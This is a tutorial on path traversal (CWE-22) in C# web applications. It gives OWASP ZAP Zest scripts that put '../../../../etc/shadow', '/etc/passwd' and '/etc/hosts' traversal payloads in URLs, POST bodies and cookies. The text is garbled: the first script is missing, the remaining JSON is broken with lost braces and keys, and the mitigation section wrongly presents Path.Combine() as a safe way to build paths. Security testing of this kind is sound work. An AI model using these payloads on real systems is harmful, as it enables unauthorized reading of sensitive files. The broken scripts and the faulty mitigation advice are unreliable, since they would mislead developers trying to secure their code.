# Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') (CWE-022) in C#

###### Understanding Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

**Definition and Exploitation:**
Improper Limitation of a Pathname to a Restricted Directory, also known as Path Traversal, occurs when an application allows the input of file paths without properly sanitizing or validating them. This enables attackers to access unauthorized files and directories by navigating the file system using special sequences such as `../` (dot-dot-slash). This type of attack can lead to exposure of sensitive information, unauthorized file manipulation, and potentially further exploitation of the system.

### Variations and Common Injection Points of Path Traversal in C# Web Applications

**Common Injection Points:**
- Path traversal vulnerabilities typically manifest in URL parameters, form inputs, HTTP headers, and cookies where file paths are handled.
  - **URL Parameters**: `http://example.com/download?file=../../../../etc/passwd`
  - **Form Inputs**: File upload forms might allow arbitrary paths.
  - **HTTP Headers**: Custom headers conveying file paths.
  - **Cookies**: Values stored in cookies that control file paths used by the application.

### Determining Indicators of Success

To detect successful path traversal attempts, typical HTTP responses indicating the presence of this vulnerability include:
- HTTP 200 status code with sensitive file contents returned.
- HTTP 500 or other server errors indicating file access attempts.
- Specific patterns in the response body or headers (e.g., filesystem paths).

### Writing OWASP ZAP Zest Scripts

**Zest Script Basic Structure:**
A Zest script generally consists of:
- Actions: Perform requests and initiate tests.
- Conditionals: Define IF-THEN statements for evaluating conditions.
- Assertions: Verify the expectations from responses.

}
```

#### 2. Detecting Path Traversal through POST Body

**Description:** This script tries to use path traversal characters in POST body data to access sensitive files.

```json

  "about": "Zest script to detect Path Traversal in POST body",
  "zestVersion": "0.8",
  "title": "Path Traversal in POST body",
  "description": "This script attempts to exploit path traversal in POST request body by trying to read /etc/shadow",

    {
      "url": "http://target-website.com/vulnerable-upload",
      "method": "POST",
      "data": "path=../../../../etc/shadow",
      "headers": "",
      "index": 1,
      "elementType": "ZestRequest"
    },
    {
      "regex": "root:.*::::::",
      "location": "BODY",
      "ifStatements": [
        {
          "message": "Path Traversal vulnerability detected - /etc/shadow content found in response",
          "index": 2,
          "elementType": "ZestActionFail"
        }
      ],
      "elseStatements": [],
      "index": 2,
      "elementType": "ZestConditionRegex"
    }
  ],
  "elementType": "ZestScript"
}
```

#### 3. Detecting Path Traversal in Cookies

**Description:** This script tests if path traversal can be achieved through cookie values.

```json
{
  "about": "Zest script to detect Path Traversal in cookie values",
  "zestVersion": "0.8",
  "title": "Path Traversal in Cookies",
  "description": "This script tries to exploit path traversal in cookies by attempting to read /etc/hosts",
  "prefix": "http://target-website.com",
  "statements": [
    {
      "url": "http://target-website.com/home",
      "method": "GET",
      "headers": "Cookie: user=../../../../etc/hosts",
      "index": 1,

    },
    {
      "regex": "127\\.0\\.0\\.1",
      "location": "BODY",
      "ifStatements": [
        {
          "message": "Path Traversal vulnerability detected - /etc/hosts content found in response",
          "index": 2,
          "elementType": "ZestActionFail"
        }
      ],
      "elseStatements": [],

      "elementType": "ZestConditionRegex"
    }

### Documentation and Explanation

**Path Traversal Vulnerability:**
Path traversal allows unauthorized access to the filesystem, potentially exposing sensitive files or allowing for remote code execution. Proper validation, canonicalization, and encoding of file paths are critical to mitigate this risk.

**Operation of Zest Scripts:**
Each script sends a crafted request intended to exploit potential path traversal issues. The response is then checked using regex conditionals to determine if sensitive file contents are returned, indicating a successful exploitation.

**Mitigation and Prevention:**
- Employ whitelisting for allowable file paths.
- Use `Path.Combine()` to safely construct file paths.
- Perform rigorous input validation and sanitation to remove control characters and sequences.

By following these steps and using the provided scripts, you can systematically test and identify path traversal vulnerabilities in your C# web applications with OWASP ZAP Zest scripts    .
